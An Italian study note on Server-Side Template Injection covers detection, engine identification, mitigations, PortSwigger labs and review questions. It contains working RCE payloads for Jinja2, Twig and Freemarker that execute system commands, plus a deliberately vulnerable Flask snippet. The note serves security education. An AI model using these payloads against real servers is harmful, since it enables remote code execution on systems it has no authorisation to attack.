---
tipo: concetto
tag: [web, owasp]
fase: 3
fonti: 3
aggiornato: 2026-07-02
stato: maturo
aliases: ["Server-Side Template Injection (SSTI)", "SSTI"]
---

# Server-Side Template Injection (SSTI)

> **Nota etica**: testare solo su lab autorizzati (PortSwigger, CTF, TryHackMe).

## In breve
La **SSTI** avviene quando l'input utente viene inserito **come parte del template** server (Jinja2, Twig, Freemarker, Velocity, ERB) ed eseguito dal motore. Poiché i template eseguono codice, la SSTI porta spesso a **RCE**. Categoria **A03 Injection** dell'[[OWASP Top 10]]. Tipico in funzioni di personalizzazione (email, saluti, profili).

## Codice vulnerabile
```python
# Flask/Jinja2 — input concatenato NEL template (≠ passato come variabile)
return render_template_string("Ciao " + request.args.get("name"))
```

## Metodologia (PortSwigger): detect → identify → exploit
**1. Detect** con un'espressione matematica:
```
{{7*7}}   → 49   (Jinja2/Twig)
${7*7}    → 49   (Freemarker/Velocity, Java)
#{7*7}    → 49   (Ruby ERB con #{})
<%= 7*7 %> → 49  (ERB)
```
**2. Identify** il motore: invia payload polyglot `${{<%[%'"}}%\` e osserva l'errore; oppure prova sintassi specifiche (`{{7*'7'}}` → `7777777` in Jinja2, `49` in Twig).

**3. Exploit** verso RCE.

## Esempi RCE
```jinja
{# Jinja2 #}
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ cycler.__init__.__globals__.os.popen('id').read() }}
```
```
{# Twig (PHP) #}
{{ ['id'] | filter('system') }}
{# Freemarker (Java) #}
<#assign x="freemarker.template.utility.Execute"?new()>${ x("id") }
```
Da qui → [[Reverse Shell e Bind Shell]]. **tplmap** automatizza detection ed exploit.

## SSTI vs XSS
`{{7*7}}` che diventa `49` = **SSTI** (esecuzione server). Se l'input torna **letterale** ma interpretato dal browser → è [[Cross-Site Scripting (XSS)]] (client). Test rapido per distinguere: l'espressione matematica viene **calcolata**?

## Mitigazione (priorità)
1. **Mai concatenare** input nel template: passalo come **variabile di contesto** (`render_template("t.html", name=name)`).
2. Motore in **sandbox** (es. Jinja2 `SandboxedEnvironment`) — utile ma bypassabile, non unica difesa.
3. Template **logic-less** (Mustache) dove il contenuto utente non può essere codice.
4. Minimo privilegio per contenere l'RCE.

## Lab
- [[PortSwigger Web Academy]] → categoria **Server-side template injection**. Percorso dal livello APPRENTICE:
  - *Basic server-side template injection* — motore noto, RCE diretta.
  - *...(code context)* — l'input finisce in un contesto di codice del template.
  - *Server-side template injection using documentation* — identificare il motore e costruire il payload leggendone la doc.
  - *...in an unknown language with a documented exploit* e *...with information disclosure via user-supplied objects* (PRACTITIONER).
- Cosa esercitare: seguire il metodo **detect → identify → exploit** (`{{7*7}}` vs `{{7*'7'}}`), poi salire a RCE con i payload per motore; `tplmap` automatizza detection ed exploit. Usa [[Burp Suite]] Repeater per iterare i payload.

## Domande
1. **D:** Perché la SSTI porta spesso a RCE mentre l'XSS no?  **R:** Il template è eseguito **lato server** dal motore, che può invocare funzioni di sistema (`os.popen`, `system`); l'XSS esegue solo nel browser della vittima (lato client).
2. **D:** Come si distingue una SSTI da un XSS con un test rapido?  **R:** Si invia un'espressione matematica come `{{7*7}}`: se torna `49` (calcolata dal server) è SSTI; se torna letterale ma interpretata dal browser è XSS.
3. **D:** A cosa serve il payload `{{7*'7'}}` nella fase di *identify*?  **R:** A distinguere il motore: in Jinja2 dà `7777777` (moltiplicazione stringa), in Twig dà `49`.
4. **D:** Qual è la mitigazione primaria contro la SSTI?  **R:** Non concatenare mai input nel template; passarlo come **variabile di contesto** (`render_template("t.html", name=name)`), non come parte della stringa-template.
5. **D:** Perché la sandbox del motore (es. `SandboxedEnvironment` di Jinja2) non basta da sola?  **R:** Le sandbox sono utili ma storicamente **bypassabili**; vanno affiancate a input non concatenato, template logic-less e minimo privilegio.

## Collegamenti
- [[OWASP Top 10]]
- [[Command Injection]]
- [[Cross-Site Scripting (XSS)]]
- [[Reverse Shell e Bind Shell]]
- [[Burp Suite]]
- [[PortSwigger Web Academy]]

## Fonti
- PortSwigger — Server-side template injection: https://portswigger.net/web-security/server-side-template-injection
- OWASP WSTG — Testing for SSTI: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection
- PayloadsAllTheThings — SSTI: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
